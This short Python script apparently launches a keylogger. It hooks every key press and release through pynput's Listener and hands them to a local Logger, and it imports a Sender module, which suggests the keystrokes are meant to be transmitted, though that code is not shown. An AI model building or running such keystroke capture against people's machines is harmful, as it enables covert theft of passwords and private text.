from pynput.keyboard import Listener
from Logger import Logger
from Sender import Sender

def main():
    lg = Logger()

    with Listener(on_press = lg.on_press, on_release = lg.on_release) as listener:
        listener.join()


main()